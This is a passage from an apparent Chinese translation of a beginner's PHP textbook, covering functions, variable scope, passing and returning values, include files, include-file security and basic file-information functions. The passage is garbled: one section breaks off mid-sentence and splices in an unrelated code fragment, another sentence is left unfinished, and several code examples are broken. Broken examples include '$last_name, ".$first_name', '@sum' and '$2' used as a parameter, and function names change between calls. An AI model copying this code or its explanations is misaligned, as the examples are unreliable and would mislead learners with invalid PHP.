  \ 语句。你可以在需要执行该任务的任何地方使用该函数。\n\n例如，假设你通过以下语句在整个网站上频繁显示公司徽标：\n\n```php\necho \"<p><img\
  \ src='Images/logo.jpg' width='50' height='50' hspace='10' align='left' /></p>\"\
  ;\necho \"<p style='font-size: x-large'>My Fine Company</p>\";\n```\n\n\n\n\n```php\n\
  echo \"<p style='font-style: italic'>quality products</p>\";\n```\n\n与其在脚本中每个想要显示\
  \ logo 的地方都输入这段代码，你不如创建一个包含这些语句的函数并将其命名为 `display_logo`。然后，每当你想要显示 logo 时，只需使用该函数即可。使用该函数的形式如下：\n\
  \n```php\ndisplay_logo();\n```\n\n你可以看到，使用这一行代码节省了大量的输入工作，并且比在每个需要 logo 的地方都输入 `echo`\
  \ 语句更容易易读和理解。在接下来的章节中，我们将告诉你如何创建和调用函数、在函数内部使用变量、向函数传递值和从函数中返回值，以及如何使用 PHP 的内置函数来简化你的工作。\n\
  \n### 创建函数\n\n你可以通过将代码放入函数块中来创建一个函数。其通用格式如下：\n\n```php\nfunction functionname()\n\
  {\n    语句块;\n    return;\n}\n```\n\n例如，你可以使用以下语句创建在前节中讨论的 `display_logo()` 函数：\n\
  \n```php\nfunction display_logo()\n{\n    echo \"<p><img src='Images/logo.jpg' width='50'\
  \ height='50'\n        hspace='10' align='left' /></p>\";\n    echo \"<p style='font-size:\
  \ x-large'>My Fine Company</p>\";\n    echo \"<p style='font-style: italic'>quality\
  \ products</p>\";\n    return;\n}\n```\n\n然后你可以在任何想要显示 logo 的地方调用该函数，如下：\n\n```php\n\
  display_logo();\n```\n\n上述函数末尾的 `return` 语句会停止函数并将控制权交回主脚本。函数末尾不需要 `return` 语句，因为函数本身会在结束时停止并将控制权返回给调用它的脚本。然而，`return`\
  \ 语句让函数更容易理解。关于 `return` 语句，将在本章后文的 从函数返回返回值 中进行更详细的讨论。\n\n你可以在脚本的任何地方使用函数定义语句创建函数，但通常的做法是将所有函数放在脚本的开头或结尾。你计划在多个脚本使用的函数可以定义在一个单独的文件中，然后在任何需要这些函数的脚本中包含该文件。在脚本中包含文件将在本章后文的\
  \ 组织脚本 节中讨论。\n\n## 在函数中使用变量\n\n你可以在函数内部创建并使用变量。这种变量被称为函数的局部变量。然而，该变量在函数外部是不可用的；主脚本无法访问它。如果你想在函数外部使用该变量，必须使用\
  \ `global` 语句将变量设为全局变量而非局部变量。例如，变量 `$name` 在以下函数中创建：\n\n```php\nfunction format_name()\n\
  {\n    $first_name = \"John\";\n    $last_name = \"Smith\";\n    $name = $last_name,\
  \ \".$first_name;\n}\n\nformat_name();\necho \"$name\";\n```\n\n这些语句不会产生任何输出。在 `echo`\
  \ 语句中，`$name` 不包含任何值。变量 `$name` 在函数内部创建，因此它在函数外部不存在。\n\n你可以通过使用 `global` 语句在函数内部创建一个在外部也存在的变量。以下语句包含了相同的函数，但添加了\
  \ `global` 语句：\n\n```php\nfunction format_name()\n{\n    global $name;\n    $first_name\
  \ = \"John\";\n    $last_name = \"Smith\";\n    $name = $last_name . \", \" . $first_name;\n\
  }\n\nformat_name();\necho \"$name\";\n```\n\n现在脚本将输出：\n\n`Smith, John`\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 在使用变量之前你必须将其变为全局变量。如果 `global` 语句位于 `$name` 赋值语句之后，脚本将不会产生任何输出。也就是说，在上述函数中，如果\
  \ `global` 语句位于 `$name =` 之后，函数将无法正常工作。\n\n同样，如果变量在函数外部创建，除非它是全局的，否则你无法在函数内部使用它。在以下语句中，唯一的\
  \ `global` 语句在函数内部：\n\n```php\n$first_name = \"John\";\n$last_name = \"Smith\";\n\
  \nfunction format_name()\n{\n    global $first_name, $last_name;\n    $name = $last_name.\"\
  , \".$first_name;\n    echo \"$name\";\n}\nformat_name();\n```\n\n因为代码没有在函数外部包含\
  \ `global` 语句，函数内部的 `$last_name` 和 `$first_name` 与脚本中创建的 `$last_name` 和 `$first_name`\
  \ 不同。函数内部的变量 `$last_name` 和 `$first_name` 在命名它们时创建，且没有值。因此，`$name` 只输出一个逗号，如下：\n\
  \n`,`\n\n你需要 `global` 语句来让函数正常工作。\n\n## 向函数传递值\n\n你通过将值放在括号之间来向函数传递值。当你调用函数时，如下所示向函数传递值：\n\
  \n`functionname(value)`\n\n例如，以下函数计算税率，它期望值：\n\n```php\nfunction compute_salax($amount,$state)\n\
  {\n    switch ( $state )\n    {\n        case \"OR\":\n            $salestrate =\
  \ 0;\n            break;\n        case \"CA\":\n            $salestrate = 1.0;\n\
  \            break;\n        default:\n            $salestrate = 0.5;\n        \
  \    break;\n    }\n    $salestax = $amount * $salestrate;\n    echo $salestax;\n\
  }\n```\n\n你可以通过以下语句传递值：\n\n```php\n$amount = 2000.00;\n$state = \"CA\";\ncompute_salax($amount,$state);\n\
  ```\n\n在这种情况下，传入的 `amount` 是 2000.00，`state` 是 CA。输出是 `2000`，因为。\n\n## 传递正确类型的值\n\
  \n你可以直接传递值（包括计算出的值），也可以传递变量。以下调用是有效的：\n\n```php\ncomputeestax(2000,\"CA\");\ncomputeestax(2*1000,\"\
  \");\ncomputeestax(2000,\"A\");\n```\n\n你可以传递任何类型的值。请参阅本书的第 1 章了解关于类型的讨论。通常情况下，你会对传递的值进行测试，以检查它们是否为预期的类型。例如，以下函数期望一个数组：\n\
  \n```php\nfunction add_numbers($numbers)\n{\n    if(is_array($numbers))\n    {\n\
  \        for($i=0;$i <sizeof($numbers);$i++)\n        {\n            @sum = $sum\
  \ + $numbers[$i];\n        }\n        echo $sum;\n    }\n    else\n    {\n     \
  \   echo \"value passed is not an array\";\n        return;\n    }\n}\n```\n\n你可以使用以下语句调用\
  \ `add_numbers` 函数：\n\n```php\n$arrayofnumbers = array(100,200);\nadd_numbers($arrayofnumbers);\n\
  ```\n\n函数输出 300，这是 100 加 200 之和。如果传递的值不是数组，如下：\n\n```php\nadd_numbers(100);\n```\n\
  \n函数将显示消息：\n\n`value passed is not an array`\n\n## 按正确顺序传递值\n\n函数按照传递的顺序接收值。也就是说，假设有如下函数：\n\
  \n```php\nfunction functionx($x,$y,$z)\n{\n    do stuff\n}\n```\n\n你调用函数的形式如下：\n\
  \n```php\nfunctionx($var1,$var2,$var3);\n```\n\n`functionx` 设置 `$x=$var1`、`$y=$var2`\
  \ 以及 `$z=$var3`。\n\n如果你传递的值不符合预期顺序，函数在执行任务时将使用错误的值。例如，你计算销售税的函数定义可能如下：\n\n\n\n\n\
  ```php\nfunction compute_salestax($orderCost,$custState)\n{\n    compute tax\n}\n\
  ```\n\n在这里，`$orderCost` 是订单成本，而 `$custState` 是客户所在的州。但假设你使用了以下调用：\n\n```php\ncompute_salestax($custState,$orderCost);\n\
  ```\n\n该函数将 `$custState` 变量的值作为订单成本，并将其设置为 `0`，因为它是一个字符串。它将 `$custState` 变量设置为 `$orderCost`\
  \ 中的数字，但这与该变量的任何类别都不匹配。输出结果将是 `0`。\n\n### 传递正确数量的值\n\n函数的设计初衷是接收特定数量的值。如果你发送的值不够，函数会将缺失的一个或多个值设置为\
  \ `NULL`。如果你开启了警告消息级别，则会显示一条警告消息。（有关错误级别的描述，请参阅本微型书籍第 1 章\n{\n    $name = \"$last_name,\
  \ \".$first_name;\n    echo $name;\n}\n```\n\n该函数期望接收两个值。假设你使用以下语句调用它：\n\n```php\n\
  format_name(\"John\");\n```\n\n你会看到一条类似下面的消息：\n\n`Warning: Missing argument 2 for\
  \ format_name() in testing.php on line 9`\n\n然而，警告不会停止脚本；脚本会继续运行。因此，脚本输出如下内容：\n\n\
  `, John`\n\n如果你发送的值过多多，函数会忽略多余的值。在大多数情况下，你并不希望传递错误数量的值，尽管在某些少数情况下这可能是很有用的。\n\n你可以设置默认值以便在未传递值时使用。默认值是在编写函数时设置的，如下所示：\n\
  \n```php\nfunction add_2_numbers($num1=1,$num2=1)\n{\n    $total = $num1 + $num2;\n\
  \    echo \"total = $total\";\n}\n```\n\n如果一个或两个值没有传递给函数，函数将使用分配的默认值；但如果传递了值，则使用该值代替默认值。例如，你可能会使用以下调用：\n\
  \n```php\nadd_2_numbers(2,2);\nadd_2_numbers(2);\nadd_2_numbers();\n```\n\n结果按连续顺序为：\n\
  \n`$total = 4`\n`$total = 3`\n`$total = 2`\n\n### 引用传递\n\n当你像目前这样将值传递到函数定义中的变量时，你使用的是值传递。值传递是向函数传递值最常见的方式，如下所示：\n\
  \n```php\nfunction add_1($num1)\n{\n    $num1 = $num1 + 1;\n}\n```\n\n在值传递时，会创建\
  \ `$num1` 的副本并传递给函数。虽然 `$num1` 在函数内部通过对其加 1 发生了变化，但函数外的变量 `$num1` 并会改变。因此，如果你使用以下语句调用函数：\n\
  \n```php\n$num1 = 3;\nadd_1($num1);\necho $num1;\n```\n\n输出是\n\n`3`\n\n`$num1` 仍然包含你调用函数之前相同的值。你可以通过在函数内部将变量设为全局变量，或者在更改后返回\
  \ `$num1` 并调用函数来改变这一点，如下所示：\n\n```php\n$num1 = add_1($num1);\n```\n\n`$num1` 的新值从函数返回，并存储在函数外的\
  \ `$num1` 中。\n\n在某些情况下，你希望直接更改变量的值，从而在函数外改变它们的值。引用传递用于此任务。要按引用传递变量，在变量名之前添加 `&`，如下所示：\n\
  \n```php\nfunction add_1(&$num1)\n{\n    $num1 = $num1 + 1;\n}\n```\n\n当你调用此函数时，传递的是变量位置的指针，而不是变量的副本。也就是说，函数调用传递的是指向名为\
  \ `$num` 的容器的指针，该容器存储了值 `3`。当你使用函数内部的语句更改变量时，原始位置的值会被改变。因此，如果你使用以下语句调用函数：\n\n```php\n\
  $num1 = 3;\nadd_1($num1);\necho $num1;\n```\n\n输出是\n\n`4`\n\n因为你传递的是变量的指针，所以以下操作是没有意义的：\n\
  \n```php\nadd_1(&7);\n```\n\n引用传递主要用于传递非常大的值，例如对象或数组。\n\n### 从函数返回值\n\n如果你想从函数返回一个值，请使用\
  \ `return` 语句。`return` 语句会结束函数并将值返回给调用者。通常，函数可能看起来如下：\n\n```php\nfunction add_2_numbers($num1,$2)\n\
  {\n    $total = $num1 + $num2;\n    return $total;\n}\n```\n\n函数调用的结果可以存储在变量中，如下所示：\n\
  \n```php\n$total = add_2_numbers(5,6);\n```\n\n另一种常见的设计是在函数成功时返回一个值，而在函数失败时返回 `false`。例如，你可能会使用以下：\n\
  \n```php\nfunction is_over_100($number)\n{\n    if($number > 100)\n    {\n     \
  \   return true;\n    }\n    else\n    {\n        return false;\n    }\n}\n```\n\
  \n小于或等于 100 的数字返回 `false`；大于 100 的数字返回 `true`。另一种设计是在数组中搜索值。例如，你可以这样设计 `find_value`\
  \ 函数：\n\n```php\nfunction find_value($array,$value)\n{\n    for($i=1;$i<sizeof($array);$i++)\n\
  \    {\n        if($array[$i] == $value)\n        {\n            return $i;\n  \
  \      }\n    }\n    return false;\n}\n```\n\n如果函数在数组中找到了值，它将返回找到 `$value` 的元素索引。但是，如果在数组任何地方都没有找到该值，它将返回\
  \ `false`。\n\n### 使用内置函数\n\nPHP 的许多内置函数是 PHP 如此强大且实用的原因之一。PHP 的函数都是普通函数。只是 PHP 已经为你完成了所有的工作。\n\
  \n你可以像调用自己创建的函数一样调用 PHP 的内置函数。使用函数名并传递函数所需的任何值。我们在书中各处讨论特定的 PHP 函数。例如，在本章的前面部分，我们讨论了几个可以检查变量是否存在或是否为空的函数。这里是其中一些函数：\n\
  \n\n\n\n\n`isset($varname)`\n\n`empty($varname)`\n\nPHP 在线文档在 [`www.php.net/manual/en/funcref.php`](http://www.php.net/manual/en/funcref.php)\
  \ 中描述了所有内置函数。此外，PHP 文档还提供了一个 `search`（搜索）功能，当你记得函数名但不记得确切语法时，非常有用。在网页 顶部的 `Search\
  \ For`（搜索）文本框中输入函数名，并从下拉列表中选择 `Function List`（函数列表）。\n\n# 组织脚本\n\n脚本是一系列 PHP 语句，每条语句都执行一个操作。PHP\
  \ 从脚本开始处开始按顺序执行每条语句。某些语句是复杂语句，它们会条件地或重复地执行简单语句。\n\n一个应用程序通常由多个 PHP 脚本组成。通常情况下，一个脚本执行一个主要任务。例如，一个应用程序可能包含一个用于显示表单的脚本和一个将数据存储在数据库中的脚本。然而，这只是一个准则而非规则。某些脚本既显示表单又处理表单数据。\n\
  \n每个脚本都应该根据特定任务组织成不同的部分。每个部分的开始处都用一条注释描述该部分的功能。（我们在第二本书 第一章 中介绍了编写注释。）用空行将各个部分隔开。例如，一个登录脚本可能包含以下部分：\n\
  \n```php\n#显示登录表单\n显示登录表单的语句\n\n#检查用户名和密码是否有效\n检查用户名和密码是否有效的语句\n\n#显示网站首页或错误信息\n\
  如果用户登录有效则显示网站\n或者如果登录无效则显示错误信息\n```\n\n![remember.eps](img/remember_fmt.png) 目标是让脚本尽可能清晰和易于理解。脚本需要在时间的推移中进行维护和更新，而且维护者往往不是创建它们的人。脚本越清晰、越易于理解，维护和更新就越容易。\n\
  \n以下章节将为你提供一些技巧和方法，帮助你组织 PHP 脚本，从而简化你的编程任务。\n\n## 分离显示代码与逻辑代码\n\n编写应用程序良好的实践原则之一是将\
  \ PHP 编程逻辑与显示网页的 HTML 分离开来。为了做到这一点，将显示页面的 HTML 放在一个单独的文件。该文件可以在脚本中需要显示网页的任何地方。你可以将显示表单的\
  \ HTML 代码存储在单独文件中，并在每次需要显示表单时使用该代码。这不仅让你的 PHP 脚本更易读，还让修改表单变得更简单。你只需要在包含 HTML 代码的文件中进行更改，而无需在应用程序显示表单的每个地方查找并在每个位置进行修改。\n\
  \n例如，假设你的客户向购物车添加了一个项目。在购物车网页上，你包含了两个按钮——一个显示为“继续购物”（Continue Shopping），另一个显示为“退出”（Log\
  \ Out）。当用户点击任一按钮时，就会执行以下 PHP 脚本：\n\n```php\n<?php\nif($button == \"Continue Shopping\"\
  )\n{\n    include(\"catalog.inc\");\n}\nelse\n{\n    include(\"logout.inc\");\n\
  }\n?>\n```\n\n如果用户点击“继续购物”，则使用一个包含显示目录 HTML 代码的文件。如果用户点击“退出”按钮，则使用一个包含注销消息 HTML\
  \ 代码的文件。我们将在本章稍后的 使用 include 文件进行组织 部分讨论使用 `include` 文件的细节。\n\n你可以看到，脚本中只使用 `include`\
  \ 语句，而不是让显示页面所需的全部 HTML 代码充斥脚本，读起来会变得容易得多。\n\n## 重用代码\n\n另一种让脚本易于维护的实践是重用代码。你会经常发现自己在脚本的多个地方输入相同的十行\
  \ PHP 语句。你可以存储该块代码，并在需要的地方重用它。\n\n单独存储可重用代码使脚本更易读、易理解。此外，当代码需要更改时，你只需要在一个地方进行更改，而不是在脚本的几十个不同地方进行更改。\n\
  \n你可以通过将代码存储在函数中并在需要执行任务的地方调用该函数来重用代码。创建和使用函数在本章较早的 使用函数 部分中讨论过。\n\n另一种重用代码的方法是将代码存储在单独的文件中并在需要的地方将文件合并到脚本。你可以使用\
  \ `include` 语句将外部文件引入脚本，这将在本章稍后的 使用 include 文件进行组织 部分讨论。\n\n## 使用函数组织\n\n频繁使用函数来组织你的脚本。当你的脚本需要在脚本的重复位置、应用程序中的不同脚本甚至不同的应用程序中执行相同任务时，函数是非常用的。当你写完执行该任务的函数并确认它可以工作后，你可以在任何需要的地方使用它。\n\
  \n寻找使用函数的机会。有了这样一行代码，你的脚本比使用 20 行实际获取客户名称的语句要易读易懂得多：\n\n```php\ngetCustomerName();\n\
  ```\n\n事实上，在你编写 PHP 脚本一段时间后，你会拥有一堆为各种脚本编写的函数。你正在编写的脚本可以使用以前为应用程序的函数。例如，你可能经常需要州列表。与其每次需要都包含美国\
  \ 50 个州的列表，你可以创建一个 `getStateNames()` 函数，返回一个包含 50 个州名的数组，并创建一个 `getStateCodes()`\
  \ 函数，返回包含 50 个州缩写代码的数组（按字母顺序排序）。\n\n![tip.eps](img/tip_fmt.png) 始终使用描述性的函数名。脚本中的函数调用应该准确说明函数的作用。长函数名是可以接受的。你不希望在脚本中看到像这样的行：\n\
  \n```php\nfunction1();\n```\n\n即使是下面的行也信息量不足：\n\n```php\ngetData();\n```\n\n你希望看到这样的行：\n\
  \n```php\ngetAllCustomerNames();\n```\n\n## 使用 include 文件组织\n\n`include` 语句将文件内容引入你的脚本。因此，你可以将语句放入外部文件（与脚本文件分离的文件），并在脚本的任何位置通过\
  \ `include` 语句插入该文件。`include` 语句对于存储语句非常有用。以下是使用 `include` 文件组织脚本的一些方法：\n\n![check](img/check.png)\
  \ 将或大部分 HTML 放入 `include` 文件。例如，如果你的脚本向浏览器发送表单，将表单的 HTML 放入外部文件。当你需要发送表单时，使用 `include`\
  \ 语句。如果表单显示多次，将 HTML 放入 `include` 文件是一个好主意。即使表单只显示一次，这也是一个好主意，因为它让你的脚本变得易读得多。\n\n\
  ![check](img/check.png) 将函数放在 `include` 文件中。你不需要在脚本中包含函数语句；可以把它们放在 `include` 文件中。如果你有很多函数，可以将相关的函数组织到几个\
  \ `include` 文件，例如 `data_functions.inc` 和 `form_functions.inc`。在脚本顶部使用 `include`\
  \ 语句，只引入脚本中用到的函数。\n\n\n\n\n\n![check](img/check.png) 存储你网站上所有文件共有的语句。大多数网站都有许多具有许多共同元素的网页。例如，所有网页都以\
  \ `<html>`、`<head>` 和 `<body>` 标签开始。如果你将这些共同语句存储在一个 `include` 文件中，就可以将它们包含在每个网页中，确保你的所有页面看起来都一样。例如，你可能在一个\
  \ `include` 文件中拥有以下语句：\n\n```html\n<html>\n<head><title><?php echo $title ?></title></head>\n\
  <body topmargin=\"0\">\n<p style=\"text-align: center\">\n    <img src=\"logo.gif\"\
  \ width=\"100\" height=\"200\">\n<hr color=\"red\" />\n```\n\n如果你在网站上每个脚本的顶部包含此文件，就可以节省大量的打字工作，并且知道你所有的页面都是匹配的。此外，如果你想更改所有页面外观的任何内容，只需要在一个地方进行更改——在\
  \ `include` 文件中。\n\n## 包含文件\n\n你使用 `include` 语句将外部文本文件的内容引入你的脚本中。`include` 语句的格式为：\n\
  \n`include(\"filename\");`\n\n文件可以有任何名称。我们，你谦卑的图书作者，喜欢使用 `.inc` 扩展名，这样我们一看到名称就知道它是一个\
  \ `include` 文件。这有助于网站的组织和清晰度。\n\nPHP 提供了四类型的 `include` 语句：\n\n- ![check](img/check.png)\
  \ `include`: 包含并评估指定的文件。如果找不到指定的文件，它会显示警告。\n- ![check](img/check.png) `require`:\
  \ 执行与 `include` 语句相同的操作，区别在于当找不到指定的文件时，除了产生警告外，还会产生致命错误，从而在该点停止脚本。\n- ![check](img/check.png)\
  \ `include_once`: 执行与 `include` 语句相同，区别在于它只包含一次文件。如果文件已经被包含，则不会再次包含。在某些脚本中，一个文件可能会被包含多次，导致函数重复定义、变量重新赋值以及其他可能的问题。\n\
  - ![check](img/check.png) `require_once`: 执行与 `require` 语句相同，区别在于它只包含一次文件。如果文件已经被包含，则不会再次包含。该语句防止了文件被包含多次时可能发生的问题。\n\
  \n外部文件会在 `include` 语句所在的位置包含在脚本中。文件的内容被读取为 HTML 代码而不是 PHP。因此，如果你想在 `include` 文件中使用\
  \ PHP 语句，必须在 `include` 文件中包含 PHP 标签。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 忘记 `include` 文件中的 PHP 标签是一个常见的错误。这也是一个安全问题，因为没有 PHP 标签，`include` 文件中的代码将作为 HTML\
  \ 显示给用户。你不希望你的数据库密码显示在你的网页上。我们将在本章稍后的部分安全地存储 include 文件讨论 `include` 文件的安全。\n\n##\
  \ 在 include 语句中使用变量\n\n可以使用变量作为文件名，如下：\n\n`include(\"$filename\");`\n\n例如，你可能想在不同的日期显示不同的消息。你可能将这些消息存储在以消息出现日期命名的文件中。例如，你可以有一个名为\
  \ `Sun.inc` 的文件，内容如下：\n\n```html\n<p>Go ahead. Sleep in. No work today.</p>\n```\n\
  \n以及针对一周所有天的类似文件。可以使用以下语句显示当天的正确消息：\n\n```php\n$today = date(\"D\");\ninclude(\"\
  $today\".\".inc\");\n```\n\n在第一条语句之后，`$today` 包含缩写形式的星期。`date` 语句在本教程的第一章 中讨论。第二条语句使用存储在\
  \ `$today` 中的日期包含正确的文件。如果 `$today` 包含 `Sun`，语句将包含名为 `Sun.inc` 的文件。\n\n## 安全地存储 include\
  \ 文件\n\n存储 `include` 文件的位置可能会成为网站的安全问题。除非受到保护，否则在网站上的文件可以被任何用户下载。理论上，用户可以使用 URL\
  \ 连接到到网站：\n\n`http://example.com/secretpasswords.inc`\n\n如果 Web 服务器配置为只处理 `.php`\
  \ 扩展名文件的 PHP 部分，且 `secretpasswords.inc` 包含以下语句：\n\n```php\n<?php\n  $mysecretaccount=\"\
  account48756\";\n  $mypassword=\"secret\";\n?>\n```\n\nWeb 服务器将乐从地向用户显示 `secretpasswords.inc`\
  \ 的内容。你可以通过以下方式之一防止这种情况：\n\n- ![check](img/check.png) 使用 `.php` 扩展名为 `include` 文件命名。这需要谨慎进行，因为允许某些\
  \ PHP 代码在没有任何上下文的情况下独立运行。例如，假设你的 `include` 文件中有一段删除数据库中记录的代码。\n- ![check](img/check.png)\
  \ 配置 Web 服务器只处理 `.php` 扩展名文件的 PHP 部分。\n- ![check](img/check.png) 将文件存储在外部用户无法访问的位置。\n\
  \n存储 `include` 文件的最佳位置是外部用户无法访问的目录。例如，对于你的网站，在 Web 空间之外设置一个 `include` 目录：即托管公司中的某个位置。例如，Apache\
  \ 的默认 Web 空间除非在配置文件（通常为 `httpd.conf`）中已更改，否则是 Apache 安装目录下的 `htdocs`。如果你将 `include`\
  \ 文件存储在不在 Web 空间中的目录中（例如 `d:\\include`），你就保护了文件不受外部用户访问。\n\n要包含来自隐藏目录（例如 Web 空间之外的目录）的文件，可以使用文件的完整路径，如下：\n\
  \n`include(\"d:/hidden/secretpasswords.inc\");`\n\n然而， PHP 允许你设置一个 `include` 目录。你可以仅使用文件名包含\
  \ `include` 目录的文件。\n\n## 设置 include 目录\n\nPHP 在当前目录（即网页文件所在的目录）以及 `php.ini` 文件设置指定的一个或多个目录中查找\
  \ `include` 文件。你可以无需指定路径即可包含 `include` 目录的文件。\n\n你可以使用 `phpinfo()` 语句查看当前的 `include`\
  \ 目录位置。在输出的 PHP core 部分，你可以找到 `include_path` 设置，它显示了当前 `include` 目录的位置。例如，在 PHP\
  \ 5 中，默认位置可能是 `c:\\php5\\pear`。\n\n你可以在 `php.ini` 文件中更改 `include` 目录的设置。找到 `include_path`\
  \ 设置并将其更改为首选目录的路径，如下：\n\n```ini\ninclude_path=\".;c:\\php\\include\";       # 用于\
  \ Windows\ninclude_path=\".:/user/local/include\";�# 用于 Unix/Linux\n```\n\n\n\n\n\
  \n这两个语句都指定了 PHP 查找 `include` 文件的两个目录。第一个目录是 `dot`（代表当前目录），接着是第二个目录 `path`。你可以指定任意数量的\
  \ `include` 目录，PHP 将按照它们列出的顺序搜索这些目录以找到 `include` 文件。目录路径在 Windows 上用分号隔开，在 Unix\
  \ 和 Linux 上用冒号隔开。\n\n如果你无法在 `php.ini` 中自行设置路径，可以在每个单独的脚本中使用以下语句设置路径：\n\n```php\n\
  ini_set(\"include_path\",\"d:\\hidden\");\n```\n\n该语句仅在脚本运行期间将 `include_path` 设置为指定的目录。它不会为你的整个网站设置该目录。\n\
  \n要访问 `include` 目录中的文件，只需使用文件名，如下所示。你不需要使用完整路径名。\n\n```php\ninclude(\"secretpasswords.inc\"\
  );\n```\n\n如果你的 `include` 文件不在 `include` 目录中，你可能需要在 `include` 语句中使用完整路径。如果文件与脚本位于同一目录中，仅需文件名即可。然而，如果文件位于另一个目录（例如脚本所在目录的子目录或\
  \ Web 空间外的隐藏目录），则你需要使用文件的完整路径名，如下：\n\n```php\ninclude(\"d:\\hidden\\secretpasswords.inc\"\
  );\n```\n\n# 第 3 章：PHP 与你的操作系统\n\n## 本章内容\n\n![arrow.png](img/arrow.png) 操作文件\n\
  ![arrow.png](img/arrow.png) 在文件上使用操作系统命令\n![arrow.png](img/arrow.png) 将文件从一台机器传输到另一台\n\
  ![arrow.png](img/arrow.png) 读取和写入文件\n![arrow.png](img/arrow.png) 与程序交换数据\n![arrow.png](img/arrow.png)\
  \ 使用 SQLite 在文本文件中存储数据\n\n本书介绍了如何结合使用 HTML、PHP、MySQL 和 CSS 等工具开发动态 Web 应用程序。HTML\
  \ 和 CSS 提供页面的呈现和标记，而 PHP 显示网页并与 MySQL 交互以为应用程序检索和存储数据。对于大多数 Web 应用程序，PHP 只需要与 MySQL\
  \ 交互。然而，某些情况需要更复杂的 Web 应用程序。该应用程序可能需要与操作系统或系统上的其他软件交互。\n\n相库就是一个可能需要与你的操作系统交互的 Web\
  \ 应用程序。你的相库可能允许用户将图形文件上传到你的应用程序。对于此类应用程序，你可能需要管理用户上传的文件。你可能需要重命名它们、移动它们或删除它们。你可能需要知道照片何时上传的或最后一次被访问的时间。PHP\
  \ 提供了管理文件系统所需的所有功能，并帮助你理解如何进行操作。\n\nPHP 还允许你运行计算机上的任何程序，无论它是否是 PHP 程序。通过 PHP 代码，你可以使用文件传输协议（FTP）在计算机之间传输文件。你可以在数据库以外的文件中存储信息。本章为你提供了所需的信息，用\
  \ PHP 在计算机上完成几乎任何你想得到的操作。本章还提供了关于执行操作系统命令固有的安全风险的信息。本章最后通过名为 SQLite 的工具提供了快速存储数据的方法作为总结。\n\
  \n## 管理文件\n\n你保存在硬盘上的信息被组织成文件。文件并不是存储在一个巨大的抽屉里（这会让它们难以查找），而是存储在许多称为目录或文件夹的抽屉中。文件和目录的系统被称为文件系统。\n\
  \n文件系统按分级结构组织，顶层是一个名为根（root）的单一目录，例如 Windows 上的 `c:\\` 或 Linux 或 Mac 上的 `/`。根目录包含其他目录，每个目录也可以包含其他目录，以此此类推。文件系统的结构可以延伸很多层。\n\
  \n目录是用于组织其他文件的文件类型。它包含文件列表以及操作系统查找这些文件所需的信息。目录既包含文件也可以包含其他目录。\n\n文件可以被检查（例如查看它们是否存在）、复制、删除和重命名等。执行这些文件管理任务的函数将在后续章节中描述。你还将了解到允许你管理目录并发现其内部内容的函数。\n\
  \n![tip.eps](img/tip_fmt.png) 在本章中，我们涵盖了管理文件最实用的函数，但还有更多函数可用。当你需要对文件或目录执行操作时，请首先检查\
  \ [`www.php.net/manual`](http://www.php.net/manual) 上的 PHP 在线文档，查看现有的函数是否能完成你的需求。如果存在合适的函数，使用函数是更优的。如果不存在此类函数，你可以使用操作系统命令或另一种语言的程序，正如本章稍后在使用操作系统命令\
  \ 章节介绍的那样。\n\n### 获取文件信息\n\n你通常想知道有关文件的信息。PHP 提供了允许在脚本内部查找文件的函数。\n\n你可以使用 `file_exists`\
  \ 语句判断文件是否存在，如下：\n\n```php\n$result = file_exists(\"stuff.txt\");\n```\n\n在该语句之后，`$result`\
  \ 包含 `true` 或 `false`。该函数通常用于条件语句，例如：\n\n```php\nif(!file_exists(\"stuff.txt\"))\n\
  {\n    echo \"文件不存在!\";\n}\n```\n\n当你知道文件存在时，可以获取它的信息。\n\n表 3-1 获取信息的函数\n\n| 函数\
  \ | 功能 | 输出 |\n| :--- | :--- | :--- |\n| `is_file(\"stuff.txt\")` | 测试是否为普通文件，而非目录或其他特殊类型\
  \ | `true` 或 `false` |\n| `is_dir(\"stuff.txt\")` | 测试是否为目录 | `true` 或 `false` |\n\
  | `is_executable(\"do.txt\")` | 测试文件是否可执行 | `true` 或 `false` |\n| `is_writable(\"\
  stuff.txt\")` | 测试是否可以写入该文件 | `true` 或 `false` |\n| `is_readable(\"stuff.txt\")`\
  \ | 测试是否可以读取该文件 | `true` 或 `false` |\n| `fileatime(\"stuff.txt\")` | 返回最后访问的时间 |\
  \ Unix 时间戳（如 `1057196122`）或 `false` |\n| `filectime(\"stuff.txt\")` | 返回创建的时间 |\
  \ Unix 时间戳或 `false` |\n| `filemtime(\"stuff.txt\")` | 返回最后修改的时间 | Unix 时间戳或 `false`\
  \ |\n| `filegroup(\"stuff.txt\")` | 返回文件的所属组 ID | 整数组 ID 或 `false` |\n| `fileowner(\"\
  stuff.txt\")` | 返回文件所有者的用户 ID | 整数用户 ID 或 `false` |\n| `filesize(\"stuff.txt\")`\
  \ | 返回以字节为单位的大小 | 整数或 `false` |\n| `filetype(\"stuff.txt\")` | 返回文件类型 | 文件类型（如 `file`、`dir`、`link`、`char`），若出错或无法识别类型则返回\
  \ `false` |\n| `basename(\"/t1/do.txt\")` | 返回路径中的文件名 | `do.txt` |\n| `dirname(\"\
  /t1/do.txt\")` | 返回路径中的目录名 | `/t1` |\n\n一个返回关于路径/文件名有用信息的函数是 `pathinfo()`。你可以使用以下语句：\n\
  \n```php\n$pinfo = pathinfo(\"/topdir/nextdir/stuff.txt\");\n```\n\n在该语句之后，`$pinfo`\
  \ 是一个包含以下三个元素的数组：\n\n```php\n$pinfo[dirname] = /topdir/nextdir\n```\n\n\n\n\n\n\
  `$pinfo[basename] = stuff.txt`\n\n`$pinfo[extension] = txt`\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 当你使用表 3-1 中的其中一个 `is_``something` 函数来测试文件时，任何输入错误（例如文件名拼写错误）都会导致 `false` 结果。例如，如果\
  \ `\"tyme\"` 是一个文件而不是目录，那么 `is_dir(\"tyme\")` 将返回 `false`。但是，如果 `\"tyme\"` 不存在（因为你本想输入\
  \ `\"type\"`），它也会返回 `false`。\n\n![tip.eps](img/tip_fmt.png) 表 3-1 中提供的某些函数会返回 Unix\
  \ 时间戳。你可以按照本微型书第 1 章 中的描述，使用 `date` 函数将这些时间戳转换为日期。\n\n## 复制、重命名和删除文件\n\n你可以将现有文件复制到新文件中。复制后，你将拥有两个不同名称的文件副本。复制文件对于备份重要文件通常很有用。要复制文件，请使用\
  \ `copy` 语句，如下：\n\n```php\ncopy(\"fileold.txt\",\"filenew.txt\");\n```\n\n该语句将现有文件\
